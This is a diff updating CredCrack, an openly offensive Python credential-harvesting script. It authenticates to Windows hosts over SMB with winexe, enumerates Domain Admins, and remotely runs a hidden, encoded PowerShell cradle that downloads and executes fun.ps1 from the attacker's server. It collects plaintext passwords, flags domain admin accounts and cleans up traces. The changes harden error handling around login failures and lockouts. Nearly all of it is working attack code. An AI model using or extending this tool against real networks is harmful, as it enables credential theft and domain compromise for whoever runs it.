@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python2
 
 # CredCrack - A fast and stealthy credential harvester
 # This script harvests credentials for any given IP(s) and
@@ -22,8 +22,8 @@
 # Author:  Jonathan Broche
 # Email:   jb@gojhonny.com
 # Twitter: @g0jhonny
-# Version: 1.0
-# Date:    2015-08-13
+# Version: 1.1
+# Date:    2015-08-26
 
 import subprocess, os, argparse, time, datetime, socket, base64, threading, Queue, hashlib, binascii, signal, sys, getpass
 from shlex import split
@@ -137,11 +137,11 @@ def enum_shares(q, username, password, domain):
                     if 'os=' in share.lower():
                         os = share.split(']')[1][5:] #operating system
                     else:
-                        if "Connection to" in share or "NetBIOS" in share or "None" in share or "------" in share: #filter bad lines
+                        if any(badline in share for badline in ["Connection to", "NetBIOS", "None", "------"]): #filter bad lines
                             pass
                         else:
                             for item in share.split(' '):
-                                if 'Printer' not in item or 'IPC' not in item and '' not in item: #no printer or ipc shares
+                                if any(badshare in share for badshare in ["Printer", "IPC", ""]): #filter printer & ipc shares
                                     if 'Disk' in item:
                                         es = ' '.join(share.split(' ')[:share.split(' ').index(item)]).strip()
                                         if es not in shares: 
@@ -177,23 +177,27 @@ def get_das(rhost, username, password, domain):
     try:
         print "{}[*]{} Querying domain admin group from {}".format(colors.blue, colors.normal, rhost.rstrip())
         process = subprocess.Popen(split("winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'".format(rhost, domain, username, password)), stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        da_output = process.stdout.read()
+        output = process.stdout.read()
         error = process.stderr.read()
 
-        if error and "NT_STATUS_LOGON_FAILURE" in error:
-            return "NT_STATUS_LOGON_FAILURE"
+        if any(err in error for err in ["NT_STATUS_LOGON_FAILURE", "NT_STATUS_ACCOUNT_LOCKED_OUT"]):
+            raise LoginFailure(error.strip())
         else:
-            for line in da_output.split('\n')[8:]:
-                if "The command completed" in line:
-                    pass
-                else:
-                    for da in line.strip().split():
-                        if da:
-                            das.append(da)
-            return das
+            da_output = output.replace("The command completed successfully.","").split()[output.split().index("Members")+2:]
+            if da_output:        
+                for da in da_output:
+                    if da:
+                        das.append(da.strip())
+                return das
 
+    except LoginFailure as e:
+        print "{}[!]{} {}".format(colors.red, colors.normal, e)       
+        sys.exit(os.EX_OSERR)
     except Exception as e:
-        print "{}[!]{} Unable to reach to {}".format(colors.red, colors.normal, rhost)
+        if "'Members' is not in list" in e:
+            print "{}[!]{} User is not an admin on {} or the system is not joined to a domain".format(colors.red, colors.normal, rhost)
+        else:
+            print "{}[!]{} Failed to obtain domain admin list from {}: {}".format(colors.red, colors.normal, rhost, e)
         return False
 
 #----------------------------------------#
@@ -213,9 +217,11 @@ def harvest(q, username, password, domain, lhost):
                 print "{}[*]{} Harvesting credentials from {}".format(colors.blue, colors.normal, rhost)
                 harvested_hosts.append(rhost)
                 encoded_cmd = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://{}/fun.ps1')".format(lhost).encode('utf_16_le'))
-                process = subprocess.Popen(split("winexe --system //{} -U {}/{}%{} 'cmd /c echo . | powershell.exe -Version 2 -w hidden -Exec Bypass -noni -nop -enc {}'".format(rhost, domain, username, password, encoded_cmd)), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+                process = subprocess.Popen(split("winexe --system //{} -U {}/{}%{} 'cmd /c echo . | powershell.exe -w hidden -Exec Bypass -noni -nop -enc {}'".format(rhost, domain, username, password, encoded_cmd)), stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                error = process.stderr.read()
+                if error and "NT_STATUS_ACCESS_DENIED" in error: raise Exception("NT_STATUS_ACCESS_DENIED")
 
-                timeout = 15
+                timeout = 20
                 while timeout > 0:
                     status = process.poll()
                     if status is None:
@@ -229,11 +235,11 @@ def harvest(q, username, password, domain, lhost):
                     process.terminate()
             q.task_done()
 
-    except subprocess.CalledProcessError as e:
-        print "{}[!]{} Error harvesting credentials from {}".format(colors.red, colors.normal, rhost)
-        q.task_done()
     except OSError:
-        pass        
+        pass
+    except Exception as e:
+        print "{}[!]{} Error harvesting credentials from {}: {}".format(colors.red, colors.normal, rhost, e)
+        q.task_done()
 
 #----------------------------------------#
 #         PARSE LOOT                     #
@@ -281,7 +287,7 @@ def output(credentials, das):
             with open ('/tmp/CCloot/l00t', 'w') as f:
                 f.write("\n " + "-" * 69 + "\n " + " CredCrack Loot \n " + "-" * 69 + "\n\n")
                 for cred in credentials:
-                    if cred[2] in das:
+                    if cred[2] in das and cred[2] != "Administrator":
                         #d = domain, #u = username, #p = password
                         print "{y}[*] Host: {r} Domain: {d} User: {u}   Password: {p}{n}".format(y=colors.yellow, r=cred[0], d=cred[1], u=cred[2], p=cred[3], n=colors.normal)
                         f.write("[*] Host: {r} Domain: {d} User: {u} Password: {p} {y}-- Domain Admin{n}\n".format(r=cred[0], d=cred[1], u=cred[2], p=cred[3], y=colors.yellow, n=colors.normal))
@@ -303,7 +309,7 @@ def output(credentials, das):
 #----------------------------------------#
 
 def clean_up(flag, stime):
-    print "{}[*]{} Cleaning up".format(colors.blue, colors.normal)
+    print "\n{}[*]{} Cleaning up".format(colors.blue, colors.normal)
     try:
         if flag: #script completed successfully
             os.remove(os.path.join('/var/www', 'creds.php'))
@@ -324,6 +330,8 @@ def clean_up(flag, stime):
             subprocess.Popen(split('service apache2 stop'), stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
             if os.path.exists('/tmp/CCloot'):
                 rmtree('/tmp/CCloot')
+            if os.path.exists('/var/www/fun.ps1'): os.remove('/var/www/fun.ps1')
+            if os.path.exists('/var/www/creds.php'): os.remove('/var/www/creds.php')
     except Exception as e:
         print "{}[!]{} Error cleaning up. {}".format(colors.red, colors.normal, e)
 
@@ -380,17 +388,13 @@ def main():
                     if args.rhost:
                         if validate(args.rhost):
                             das = get_das(args.rhost, args.user, args.passwd, args.domain)
-                            if "NT_STATUS_LOGON_FAILURE" in das:
-                                raise LoginFailure(args.rhost)
                             q.put(args.rhost)
                     if args.file:
                         with open (args.file) as f:
                             lines = [ip.strip() for ip in f.readlines() if ip.strip() and validate(ip.strip())]
                             for line in lines:
                                 das = get_das(line, args.user, args.passwd, args.domain)
-                                if "NT_STATUS_LOGON_FAILURE" in das:                                    
-                                    raise LoginFailure(line)
-                                elif not das: #put the host on a bad list
+                                if not das: #put the host on a bad list
                                     badhost.append(lines[lines.index(line)])
                                 else: #we got our domain admin list
                                     if badhost: #if badhosts, filter before queue
@@ -417,14 +421,10 @@ def main():
                 print "{}[!]{} Provide the IP address of the local host [-l]\n".format(colors.red, colors.normal)
 
     except (KeyboardInterrupt, SystemExit):
-        print "\n{}[!]{} Ctrl-C detected...shutting down".format(colors.yellow, colors.normal)
+        print "\n{}[!]{} Terminating script".format(colors.yellow, colors.normal)
         clean_up(False, stime)      
     except IOError:
         print "{}[!]{} File: {} does not exist.".format(colors.red, colors.normal, args.file)
         clean_up(False, stime)
-    except LoginFailure as e:
-        print "{}[!]{} Login Failure on {}, ensure you have entered the correct credentials\n".format(colors.red, colors.normal, e)
-        clean_up(False, stime)
-
 if __name__ == '__main__':
     main()
